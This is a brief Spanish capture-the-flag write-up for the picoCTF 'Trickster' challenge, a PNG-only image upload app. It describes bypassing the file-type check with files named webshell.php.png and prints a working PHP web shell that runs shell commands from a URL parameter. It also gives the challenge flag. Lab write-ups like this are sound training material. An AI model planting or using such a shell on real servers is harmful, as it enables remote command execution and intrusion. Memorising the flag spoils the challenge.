## Trickster
## Descripción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
## Solución
realizamos varios documentos llamados webshell.php y webshell.php.png (cambiamos php y png) para poder aprobechar esa vulnerabilidad
```
PNG
<?php
if(isset($_GET['cmd'])){
    echo"<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}
## Notas
## Referencias